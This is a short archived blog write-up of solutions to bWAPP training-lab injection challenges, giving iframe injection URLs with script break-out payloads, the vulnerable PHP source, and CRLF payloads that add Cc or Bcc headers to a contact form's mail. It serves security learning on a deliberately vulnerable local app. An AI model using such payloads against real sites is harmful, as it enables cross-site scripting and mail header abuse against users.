---
title: "BWAPP IFrame and SMTP Injection"
date: 2019-01-21 00:00:00 +0530
categories: [Writeups]
tags: [Bwapp]
description: "BWAPP IFrame and Mail Header Injection (SMTP) solution"
permalink: /Writeups/bwapp-iframe-smtp/
redirect_from:
  - /bwapp-iframe-smtp
  - /bwapp-iframe-smtp/
archived: true
---


# BWAPP A1 - Injection


## IFrame Injection:

### LOW LEVEL :

By viewing the source code page, construct the payload accordingly.

payloads to be used are,
```
localhost/bwapp/iframei.php?ParamUrl=https://www.mukhilan.com&ParamWidth=250"&ParamHeight=250
localhost/bwapp/iframei.php?ParamUrl=javascript:alert(1)&ParamWidth=250%22&ParamHeight=250
```

The source code is,
```
<iframe frameborder="0" src="<?php echo xss($_GET["ParamUrl"])?>" height="<?php echo xss($_GET["ParamHeight"])?>" width="<?php echo xss($_GET["ParamWidth"])?>"></iframe>
```

### MEDIUM LEVEL :

```
localhost/bwapp/iframei.php?ParamUrl=robots.txt&ParamWidth=250%22%3E%3C/iframe%3E%3Cscript%3Ealert(1);%3C/script%3E&ParamHeight=250
```
payload is `"></iframe><script>alert(1);</script>`.
Iframe's last parameter is width. So, Payload should inject after paramWidth.

The source code is,
```
<iframe frameborder="0" src="robots.txt" height="<?php echo xss($_GET["ParamHeight"])?>" width="<?php echo xss($_GET["ParamWidth"])?>"></iframe>
```


## Mail Header Injection (SMTP):

In this, if the input field in the contact page is not filtered correctly. Then we can add extra content to the SMTP Header as below.

In mail field, payload can be `exp1@exp1.com\r\nCc:exp@exp.com` or `exp1@exp1.com\r\nbcc:exp@exp.com`.

Check the link in the reference section, Acunetix gave a good explanation of this vulnerability.


## Reference

```
https://www.acunetix.com/blog/articles/email-header-injection/
https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet
```
